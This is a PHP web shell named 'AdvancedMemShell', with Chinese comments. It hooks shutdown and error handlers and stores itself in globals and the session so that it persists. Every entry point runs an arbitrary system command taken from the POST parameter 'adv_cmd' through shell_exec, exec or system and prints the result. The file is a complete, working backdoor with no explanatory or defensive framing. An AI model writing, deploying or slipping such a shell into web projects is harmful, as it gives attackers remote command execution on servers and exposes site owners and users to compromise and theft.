<?php
class AdvancedMemShell {
    private static $instance = null;
    private $handlers = [];
    
    private function __construct() {
        $this->registerHandlers();
    }
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function registerHandlers() {
        // 注册多种处理器
        register_shutdown_function([$this, 'shutdownHandler']);
        set_error_handler([$this, 'errorHandler']);
        
        // 注册到全局变量
        $GLOBALS['_advanced_shell'] = $this;
        
        // Session处理
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        $_SESSION['_shell_handler'] = $this;
    }
    
    public function execute($cmd) {
        if (function_exists('shell_exec')) {
            return shell_exec($cmd);
        } elseif (function_exists('exec')) {
            exec($cmd, $output);
            return implode("\n", $output);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd);
            return ob_get_clean();
        }
        return "No execution function available";
    }
    
    public function shutdownHandler() {
        if (isset($_POST['adv_cmd'])) {
            echo $this->execute($_POST['adv_cmd']);
        }
    }
    
    public function errorHandler($errno, $errstr, $errfile, $errline) {
        if (isset($_POST['adv_cmd'])) {
            echo $this->execute($_POST['adv_cmd']);
            return true;
        }
        return false;
    }
}

// 初始化
AdvancedMemShell::getInstance();

// 检查直接调用
if (isset($_POST['adv_cmd'])) {
    echo AdvancedMemShell::getInstance()->execute($_POST['adv_cmd']);
}
?>